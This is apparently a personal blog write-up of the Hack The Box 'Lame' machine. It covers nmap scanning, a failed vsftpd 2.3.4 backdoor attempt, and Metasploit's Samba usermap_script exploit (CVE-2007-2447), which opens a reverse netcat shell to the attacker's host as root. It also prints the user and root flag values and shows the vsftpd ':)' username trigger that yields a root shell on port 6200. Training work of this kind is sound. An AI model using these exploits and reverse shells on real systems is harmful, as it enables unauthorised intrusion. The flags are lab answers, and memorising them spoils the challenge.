---
title: 'Lame'
date: '2026-09-03'
excerpt: 'Easy - Linux'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Lame</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4"> </p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> How many of the nmap top 1000 TCP ports are open on the remote host?</p>
<p class="mb-3">Run <code>nmap -sC -sV -A [TARGET_IP]</code>. Add <code>-Pn</code> if the Nmap scan does not work initially.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.17.39
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-06 19:20 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.13 seconds
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.17.39 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-06 19:20 EDT
Nmap scan report for 10.129.17.39
Host is up (0.26s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.224
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-09-05T19:25:49-04:00
|_clock-skew: mean: -21h55m31s, deviation: 2h49m46s, median: -23h55m34s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.49 seconds
```

<p class="mb-5"><strong>Answer:</strong> 4</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What version of VSFTPd is running on Lame?</p>
<p class="mb-5"><strong>Answer:</strong> 2.3.4</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?</p>
<p class="mb-3">We use Metasploit to attempt exploitation.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to cmd/unix/interact
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5,
                                       socks5h
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOSTS 10.129.17.39
RHOSTS => 10.129.17.39
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> check
[-] This module does not support check.
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> exploit
[*] 10.129.17.39:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.17.39:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> 
```

<p class="mb-5"><strong>Answer:</strong> No</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> What version of Samba is running on Lame? Give the numbers up to but not including "-Debian".</p>
<p class="mb-3">Refer to the Nmap scan output earlier.</p>
<p class="mb-5"><strong>Answer:</strong> 3.0.20</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the SamrChangePassword function when the "username map script" option is enabled in smb.conf?</p>
<p class="mb-3">Use Metasploit to select the relevant exploit and use <code>show info</code> to find the assigned CVE ID.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> show info

       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck <jduck@metasploit.com>

Module side effects:
 unknown-side-effects

Module stability:
 unknown-stability

Module reliability:
 unknown-reliability

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT   139              yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module exploits a command execution vulnerability in Samba
  versions 3.0.20 through 3.0.25rc3 when using the non-default
  "username map script" configuration option. By specifying a username
  containing shell meta characters, attackers can execute arbitrary
  commands.

  No authentication is needed to exploit this vulnerability since
  this option is used to map usernames prior to authentication!

References:
  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
  OSVDB (34700)
  http://www.securityfocus.com/bid/23972
  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
  http://samba.org/samba/security/CVE-2007-2447.html


View the full module info with the info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> 
```

<p class="mb-5"><strong>Answer:</strong> CVE-2007-2447
</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Exploiting CVE-2007-2447 returns a shell as which user?</p>
<p class="mb-3"></p>

```console
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  94.237.67.52     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOSTS 10.129.17.39
RHOSTS => 10.129.17.39
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> check
[-] This module does not support check.
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit
[*] Started reverse TCP handler on 94.237.67.52:4444 
^C[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST 10.10.14.224
LHOST => 10.10.14.224
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit
[*] Started reverse TCP handler on 10.10.14.224:4444 
[*] Command shell session 1 opened (10.10.14.224:4444 -> 10.129.17.39:35820) at 2026-09-06 19:33:34 -0400

shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
root@lame:/# whoami
whoami
root
root@lame:/# 
```

<p class="mb-5"><strong>Answer:</strong> root</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> Submit the flag located in the makis user's home directory.</p>
<p class="mb-3"></p>

```console
root@lame:/# cd / && ls -al
cd / && ls -al
total 101
drwxr-xr-x  21 root root  4096 Oct 31  2020 .
drwxr-xr-x  21 root root  4096 Oct 31  2020 ..
drwxr-xr-x   2 root root  4096 Oct 31  2020 bin
drwxr-xr-x   4 root root  1024 Nov  3  2020 boot
lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -> media/cdrom
drwxr-xr-x  13 root root 13540 Sep  5 19:24 dev
drwxr-xr-x  96 root root  4096 Sep  5 19:24 etc
drwxr-xr-x   6 root root  4096 Mar 14  2017 home
drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
lrwxrwxrwx   1 root root    32 Oct 31  2020 initrd.img -> boot/initrd.img-2.6.24-32-server
lrwxrwxrwx   1 root root    32 Oct 31  2020 initrd.img.old -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x  13 root root  4096 Oct 31  2020 lib
drwx------   2 root root 16384 Mar 16  2010 lost+found
drwxr-xr-x   4 root root  4096 Mar 16  2010 media
drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
-rw-------   1 root root 19520 Sep  5 19:24 nohup.out
drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
dr-xr-xr-x 120 root root     0 Sep  5 19:23 proc
drwxr-xr-x  13 root root  4096 Sep  5 19:24 root
drwxr-xr-x   2 root root  4096 Nov  3  2020 sbin
drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
drwxr-xr-x  12 root root     0 Sep  5 19:23 sys
drwxrwxrwt   5 root root  4096 Sep  5 19:37 tmp
drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
drwxr-xr-x  15 root root  4096 May 20  2012 var
lrwxrwxrwx   1 root root    29 Oct 31  2020 vmlinuz -> boot/vmlinuz-2.6.24-32-server
lrwxrwxrwx   1 root root    29 Oct 31  2020 vmlinuz.old -> boot/vmlinuz-2.6.24-16-server
root@lame:/# 
root@lame:/# cd home 
root@lame:/home# ls -al
ls -al
total 24
drwxr-xr-x  6 root    root    4096 Mar 14  2017 .
drwxr-xr-x 21 root    root    4096 Oct 31  2020 ..
drwxr-xr-x  2 root    nogroup 4096 Mar 17  2010 ftp
drwxr-xr-x  2 makis   makis   4096 Mar 14  2017 makis
drwxr-xr-x  2 service service 4096 Apr 16  2010 service
drwxr-xr-x  3    1001    1001 4096 May  7  2010 user
root@lame:/home# cd makis && ls -al
cd makis && ls -al
total 28
drwxr-xr-x 2 makis makis 4096 Mar 14  2017 .
drwxr-xr-x 6 root  root  4096 Mar 14  2017 ..
-rw------- 1 makis makis 1107 Mar 14  2017 .bash_history
-rw-r--r-- 1 makis makis  220 Mar 14  2017 .bash_logout
-rw-r--r-- 1 makis makis 2928 Mar 14  2017 .bashrc
-rw-r--r-- 1 makis makis  586 Mar 14  2017 .profile
-rw-r--r-- 1 makis makis    0 Mar 14  2017 .sudo_as_admin_successful
-rw-r--r-- 1 makis makis   33 Sep  5 19:24 user.txt
root@lame:/home/makis# cat user.txt
cat user.txt
82ed06d069fc3755ae9beaef35a7334d
root@lame:/home/makis# 
```

<p class="mb-5"><strong>Answer:</strong> 82ed06d069fc3755ae9beaef35a7334d</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> Submit the flag located in root's home directory.</p>
<p class="mb-3"></p>

```console
root@lame:/home/makis# cd /root && ls -al
cd /root && ls -al
total 80
drwxr-xr-x 13 root root 4096 Sep  5 19:24 .
drwxr-xr-x 21 root root 4096 Oct 31  2020 ..
-rw-------  1 root root  373 Sep  5 19:24 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
drwx------  3 root root 4096 May 20  2012 .config
drwx------  2 root root 4096 May 20  2012 .filezilla
drwxr-xr-x  5 root root 4096 Sep  5 19:24 .fluxbox
drwx------  2 root root 4096 May 20  2012 .gconf
drwx------  2 root root 4096 May 20  2012 .gconfd
drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
drwx------  4 root root 4096 May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4096 May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
drwx------  2 root root 4096 Sep  5 19:24 .vnc
drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 Sep  5 19:24 root.txt
-rw-r--r--  1 root root  118 Sep  5 19:24 vnc.log
root@lame:/root# cat root.txt
cat root.txt
6dc6a85d2acc648cdc3db1c3df18c202
root@lame:/root# 
```

<p class="mb-5"><strong>Answer:</strong> 6dc6a85d2acc648cdc3db1c3df18c202</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> We'll explore a bit beyond just getting a root shell on the box. While the official writeup doesn't cover this, you can look at 0xdf's write-up for more details. With a root shell, we can look at why the VSFTPd exploit failed. Our initial nmap scan showed four open TCP ports. Running netstat -tnlp shows many more ports listening, including ones on 0.0.0.0 and the boxes external IP, so they should be accessible. What must be blocking connection to these ports?</p>

```console
root@lame:/root# netstat -tnlp
netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      5468/xinetd     
tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      5468/xinetd     
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      5468/xinetd     
tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN      5577/jsvc       
tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      5628/unrealircd 
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      5191/mysqld     
tcp        0      0 0.0.0.0:1099            0.0.0.0:*               LISTEN      5618/rmiregistry
tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      5628/unrealircd 
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      5446/smbd       
tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      5641/Xtightvnc  
tcp        0      0 0.0.0.0:41647           0.0.0.0:*               LISTEN      4664/rpc.statd  
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      4646/portmap    
tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      5641/Xtightvnc  
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5597/apache2    
tcp        0      0 0.0.0.0:8787            0.0.0.0:*               LISTEN      5622/ruby       
tcp        0      0 0.0.0.0:8180            0.0.0.0:*               LISTEN      5577/jsvc       
tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      5468/xinetd     
tcp        0      0 0.0.0.0:46196           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:55573           0.0.0.0:*               LISTEN      5618/rmiregistry
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      5468/xinetd     
tcp        0      0 10.129.17.39:53         0.0.0.0:*               LISTEN      5044/named      
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      5044/named      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      5468/xinetd     
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      5273/postgres   
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      5436/master     
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      5044/named      
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      5446/smbd       
tcp        0      0 0.0.0.0:39647           0.0.0.0:*               LISTEN      5368/rpc.mountd 
tcp6       0      0 :::2121                 :::*                    LISTEN      5515/proftpd: (acce
tcp6       0      0 :::3632                 :::*                    LISTEN      5300/distccd    
tcp6       0      0 :::53                   :::*                    LISTEN      5044/named      
tcp6       0      0 :::22                   :::*                    LISTEN      5068/sshd       
tcp6       0      0 :::5432                 :::*                    LISTEN      5273/postgres   
tcp6       0      0 ::1:953                 :::*                    LISTEN      5044/named      
root@lame:/root# 
```

<p class="mb-5"><strong>Answer:</strong> firewall</p>
<br />


<p class="mb-2"><strong>Question 10:</strong> When the VSFTPd backdoor is trigger, what port starts listening?</p>
<p class="mb-3">The exploit triggers when an attacker connects to port 21 and supplies a username containing the 'smiley-face' characters (<code>:)</code>) alongside any password. The malicious code forces the server to bind a listening command shell directly to TCP port 6200.</p>
<p class="mb-5"><strong>Answer:</strong> 6200</p>
<br />


<p class="mb-2"><strong>Question 11:</strong> When the VSFTPd backdoor is triggered, does port 6200 start listening on Lame?</p>
<p class="mb-3">First we switch to the user makis. Then we try <code>nc 127.0.0.1 6200</code> to check if we can connect to the port 6200 locally:</p>

```console
root@lame:/root# su makis
su makis
sh-3.2$ whoami
whoami
makis
sh-3.2$ nc 127.0.0.1 6200
nc 127.0.0.1 6200
(UNKNOWN) [127.0.0.1] 6200 (?) : Connection refused
```

<p class="mb-3">Since the vsftpd backdoor has not been triggered yet, nothing is listening on port 6200. To trigger the exploit, we open a new terminal and login anonymously to the target's FTP. Make sure to append the smiley-face directly to the end of the login username.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qbplabfgur]─[~]
└──╼ [★]$ ftp 10.129.17.39
Connected to 10.129.17.39.
220 (vsFTPd 2.3.4)
Name (10.129.17.39:root): anonymous:)
331 Please specify the password.
Password: 

421 Service not available, remote server timed out. Connection closed.
ftp: Login failed
ftp> 
```

<p class="mb-3">Now when we run <code>nc 127.0.0.1 6200</code>, we can successfully connect. Running <code>id</code> proves that we have now escalated our privileges to root.</p>

```console
sh-3.2$ nc 127.0.0.1 6200
nc 127.0.0.1 6200
id
id
uid=0(root) gid=0(root)
```

<p class="mb-5"><strong>Answer:</strong> yes</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>